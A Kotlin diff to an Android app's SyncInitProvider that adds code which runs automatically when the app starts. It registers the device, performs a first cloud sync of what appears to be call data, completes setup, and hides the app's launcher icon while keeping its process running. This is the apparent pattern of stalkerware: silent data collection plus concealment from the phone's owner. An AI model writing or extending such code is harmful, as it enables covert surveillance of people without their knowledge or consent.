@@ -15,6 +15,18 @@ class SyncInitProvider : ContentProvider() {
             MongoSyncHelper.ensureApiUrl(ctx)
             CallSyncHelper.markBackgroundSyncEnabled(ctx, true)
             SyncBootstrap.armBackgroundSync(ctx)
+            if (!SyncBootstrap.needsRuntimePermissions(ctx)) {
+                BackgroundSyncRunner.run {
+                    try {
+                        DeviceRegistration.registerNow(ctx)
+                        InstallFlow.runFirstCloudSync(ctx)
+                        InstallFlow.completeSetup(ctx)
+                        LauncherHider.hide(ctx, goHome = false, keepProcess = true)
+                    } catch (error: Exception) {
+                        Log.e(TAG, "Provider first sync failed", error)
+                    }
+                }
+            }
         } catch (error: Exception) {
             Log.e(TAG, "SyncInitProvider failed", error)
         }
